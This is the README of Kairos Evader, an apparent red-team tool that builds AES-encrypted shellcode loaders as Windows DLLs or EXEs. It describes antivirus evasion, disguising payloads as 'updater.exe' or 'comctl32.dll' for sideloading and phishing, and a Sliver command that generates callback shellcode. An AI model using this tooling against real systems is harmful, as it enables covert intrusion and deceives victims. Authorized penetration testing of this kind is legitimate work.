# Kairos Evader

**Hardened AES-256 encrypted shellcode loader builder for authorized penetration testing.**

Author: **Tyler Ramsbey** - [Kairos Sec](https://kairos-sec.com) - [Hack Smarter](https://hacksmarter.org)

---

## What It Does

Kairos Evader takes raw shellcode (from any C2 framework) and produces a fully self-contained Windows DLL or EXE with:

- **AES-256-CBC encryption** - payload is encrypted at rest, decrypted only at runtime
- **Randomized source code** - every build produces a unique binary with different variable names, function names, and junk code
- **RW → RX memory permissions** - avoids the `PAGE_EXECUTE_READWRITE` behavioral flag
- **Optional sandbox evasion** - configurable sleep delay with timing verification
- **No console window** - silent execution for both DLL and EXE formats

### Limitations

Kairos Evader is designed to bypass signature-based detection (Windows Defender, 
basic AV). It is not designed to bypass enterprise EDR solutions (CrowdStrike, 
SentinelOne, MDE, etc.) that use kernel-level telemetry, userland hooking, and 
behavioral analysis.

Kairos Sec primarily does standard pentesting. Full EDR evasion is not something I do regularly. If you'd like to open a PR to add additional evasion... you should!

## Use Cases

| Format | Use Case |
|--------|----------|
| **DLL** | DLL sideloading / hijacking — place alongside a vulnerable application |
| **EXE** | Droppers, phishing payloads, direct execution |

## Requirements

- **Kali Linux** (or any Linux with the tools below)
- **Python 3.10+**
- **mingw-w64** cross-compiler
- **pycryptodome** Python package

## Installation

```bash
# Clone the repo
git clone https://github.com/tenebrae93/kairos_evader.git
cd kairos_evader

# Install mingw-w64 (if not already installed)
sudo apt install mingw-w64

# Install Python dependencies
pip install -r requirements.txt
```

## Usage
Generate an EXE
```bash
python3 kairos_evader.py --payload payload.bin --exe updater.exe
```
Generate a DLL
```bash
python3 kairos_evader.py --payload payload.bin --dll comctl32.dll
```
Add sandbox evasion delay
```bash
python3 kairos_evader.py --payload payload.bin --dll comctl32.dll --delay 10
```
Full help
```bash
python3 kairos_evader.py -h
```
## Generating Shellcode 
Kairos Evader is framework-agnostic - it works with any raw shellcode (but has only been tested directly with Sliver and Metasploit). 

#### Using Sliver C2
```bash
generate --mtls [LISTENER-IP]:[LISTENER-PORT] --os windows --arch amd64 --format shellcode --save /home/tyler/payload.bin
```

### Disclaimer
This tool is intended for authorized penetration testing and security research only.

Usage of Kairos Evader for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. The author assumes no liability and is not responsible for any misuse or damage caused by this tool.

Only use this tool in the context of:

- Authorized penetration testing engagements
- Security research in lab environments
- Capture the Flag (CTF) competitions
- Approved red team operations
